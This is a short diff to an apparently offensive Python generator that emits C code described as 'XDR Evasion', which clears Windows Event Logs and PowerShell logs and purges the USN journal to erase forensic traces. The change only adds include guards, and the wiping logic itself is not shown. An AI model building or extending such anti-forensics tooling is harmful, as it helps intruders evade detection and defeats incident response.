@@ -29,6 +29,9 @@ def generate_log_tampering() -> Dict[str, Any]:
 // Layer 4 – XDR Evasion
 // Clears selected Windows Event Log channels to remove forensic artefacts.
 
+#ifndef PHANTOM_LOG_TAMPERING_INCLUDED
+#define PHANTOM_LOG_TAMPERING_INCLUDED
+
 #include <windows.h>
 #include <winevt.h>
 #pragma comment(lib, "wevtapi.lib")
@@ -85,6 +88,8 @@ static void clear_all_logs(void) {
     clear_powershell_logs();
     purge_usn_journal();
 }
+
+#endif /* PHANTOM_LOG_TAMPERING_INCLUDED */
 """
 
     return {
